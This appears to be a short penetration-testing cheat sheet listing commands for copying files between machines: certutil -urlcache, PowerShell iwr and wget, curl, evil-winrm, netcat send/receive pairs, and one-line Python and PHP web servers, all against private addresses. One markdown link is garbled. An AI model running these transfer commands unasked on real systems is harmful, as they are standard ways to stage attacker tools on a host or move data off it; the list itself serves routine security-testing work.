# Files Copy


* certutil.exe
```
certutil -urlcache -f http://192.168.62.68/file.txt file.txt
```

* invoke-webrequest
```
powershell.exe iwr -uri 192.168.1.2/file.txt -o C:\Temp\fileoutput.txt
```

* wget
```
powershell.exe wget [http://192.168.1.62/f](http://192.168.1.2/putty.exe)ile.txt -OutFile file.txt
```

* curl

```
curl http://192.168.1.2/file.txt -o fileout.txt
```

* evil-winrm
```
evil-winrm : upload/download options
```

* netcat
 
To serve file (on computer A):

```
cat something.zip | nc -l -p 1234

```
To receive file (on computer B):

```
netcat server.ip.here. 1234 > something.zip
```

* Starting div webserver :

```
python -m http.server 80
php -S 0.0.0.0:80 
```
